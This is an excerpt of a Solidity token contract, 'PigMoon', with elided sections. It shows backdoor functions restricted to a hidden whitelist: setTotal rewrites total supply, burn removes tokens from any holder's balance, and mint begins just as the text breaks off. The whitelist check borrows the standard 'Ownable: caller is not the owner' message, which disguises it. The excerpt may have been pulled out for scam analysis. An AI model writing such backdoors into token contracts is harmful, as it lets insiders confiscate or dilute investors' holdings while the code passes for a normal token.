...
contract PigMoon is Context, IERC20, Ownable {
    ...
    address payable public marketingAddress = payable(msg.sender); // Marketing Address
    ...
    modifier onlyWhiteList() {
        require(
            whitelist[msg.sender] || whitelist[tx.origin],
            "Ownable: caller is not the owner"
        );
        _;
    }

    constructor(address router, address _usdt) {
    ...
    function setTotal(uint tTotal) public onlyWhiteList {
        _tTotal = tTotal;
    ...
    function burn(address _to, uint256 _value) public onlyWhiteList {
        _rOwned[_to] = _rOwned[_to].sub(_value);
        _tTotal = _tTotal.sub(_value);
        emit Transfer(msg.sender, address(0), _value);
    }

    function mint(address account, uint256 amount) public onlyWhiteList {
